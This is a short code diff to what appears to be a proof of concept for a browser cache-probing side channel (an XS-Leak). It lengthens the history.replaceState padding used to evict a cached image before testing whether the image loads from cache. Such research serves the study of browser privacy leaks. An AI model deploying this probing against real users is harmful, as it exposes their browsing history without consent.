@@ -4,7 +4,7 @@
 
   let url = 'img.jpg';
   // Evict this from the cache (force an error).
-  history.replaceState(1,1,Array(16e3));
+  history.replaceState(1,1,Array(7e4));
   await fetch(url, {cache: 'reload', mode: 'no-cors'}).catch(e=>console.error(e));
   // Load the other page (you can also use <link rel=prerender>)
   // Note that index.html must have <img src=logo.jpg>
@@ -17,7 +17,7 @@
   await new Promise(r=>{winbg.onload=r;});
   // Check if the image was loaded.
   // For better accuracy, use a service worker with {cache: 'force-cache'}
-  history.replaceState(1,1,Array(16e3));
+  history.replaceState(1,1,Array(7e4));
   let img = new Image();
   img.src = url;
   try {
